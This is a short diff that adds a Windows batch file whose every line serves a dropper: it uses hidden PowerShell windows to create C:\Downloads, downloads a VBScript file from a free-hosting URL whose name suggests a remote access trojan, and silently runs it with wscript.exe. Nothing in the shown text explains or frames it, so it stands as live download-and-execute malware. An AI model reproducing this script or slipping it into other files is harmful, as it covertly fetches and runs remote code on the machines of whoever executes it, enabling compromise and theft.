@@ -1,0 +1,3 @@
+@echo off
+powershell.exe -WindowStyle hidden -Command "New-Item -ItemType Directory -Force -Path 'C:\Downloads'; Invoke-WebRequest -Uri 'https://ratandroidtnk.000webhostapp.com/test' -OutFile 'C:\Downloads\test.vbs'"
+powershell.exe -WindowStyle hidden -Command "& {Start-Process 'wscript.exe' -ArgumentList 'C:\Downloads\test.vbs' -WindowStyle Hidden}"
